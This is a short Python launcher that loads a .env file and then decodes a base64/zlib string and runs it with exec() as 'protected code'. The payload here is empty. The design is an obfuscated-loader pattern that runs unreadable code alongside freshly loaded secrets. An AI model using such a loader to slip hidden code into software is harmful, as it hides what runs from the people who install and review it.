import base64, zlib, os, sys
from pathlib import Path

def main():
    # Load .env if exists
    env_path = Path(__file__).parent / '.env'
    if env_path.exists():
        try:
            from dotenv import load_dotenv
            load_dotenv(env_path)
        except ImportError:
            pass
    
    # Decode and execute protected code
    code = zlib.decompress(base64.b64decode("")).decode('utf-8')
    exec(code, globals())

if __name__ == "__main__":
    main()
